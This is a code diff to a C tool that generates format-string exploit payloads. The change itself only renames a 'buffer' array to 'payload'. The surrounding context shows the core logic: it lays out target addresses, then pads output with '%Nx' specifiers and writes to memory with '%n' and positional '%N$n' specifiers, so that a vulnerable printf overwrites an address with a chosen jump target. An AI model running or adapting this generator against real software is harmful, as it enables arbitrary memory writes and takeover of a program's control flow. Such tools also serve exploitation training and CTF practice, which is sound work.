@@ -24,7 +24,7 @@
 #include <stdio.h>
 #include <getopt.h>
 
-unsigned char buffer[4096];
+static unsigned char payload[4096];
 
 /* address to override */
 static unsigned long override_addr_g;
@@ -32,7 +32,7 @@ static unsigned long override_addr_g;
 /* address to jump to */
 static unsigned long jmp_addr_g;
 
-/* index of the element on the stack which is the beginning of the buffer */
+/* index of the element on the stack which is the beginning of the payload */
 static unsigned int idx_stack_g;
 
 /* assume that an address is 'address_size_g' bytes long */
@@ -153,7 +153,7 @@ int main(int argc, char *argv[])
 	\
 	for (int sh = 0; sh < address_size_g; ++sh) { \
 	    for (int shift = 0; shift < address_size_g; ++shift) { \
-		buffer[i++] = (override_addr >> (shift * 8)) & 0xff; \
+		payload[i++] = (override_addr >> (shift * 8)) & 0xff; \
 		++written; \
 	    } \
 	    ++override_addr; \
@@ -175,27 +175,27 @@ int main(int argc, char *argv[])
 	int remaining;
 
 	if ((remaining = calc_remaining((jmp_addr_g >> (shift * 8)) & 0xff, &written)) < 8) {
-	    memcpy(buffer + i, "ffffffff", remaining);
+	    memcpy(payload + i, "ffffffff", remaining);
 	    i += remaining;
 	} else {
-	    i += sprintf((char *)buffer + i, "%%%dx", remaining);
+	    i += sprintf((char *)payload + i, "%%%dx", remaining);
 	    ++values_pop;
 	}
 
 	if (values_pop == idx_stack_g) {
 	    /* (very) unlikely */
 
-	    i += sprintf((char *)buffer + i, "%%n");
+	    i += sprintf((char *)payload + i, "%%n");
 	    ++values_pop;
 	} else {
-	    i += sprintf((char *)buffer + i, "%%%d$n", idx_stack_g);
+	    i += sprintf((char *)payload + i, "%%%d$n", idx_stack_g);
 	}
 
 	++idx_stack_g;
     }
 
     /* we write our payload */
-    fwrite(buffer, 1, i, stdout);
+    fwrite(payload, 1, i, stdout);
 
     return 0;
 
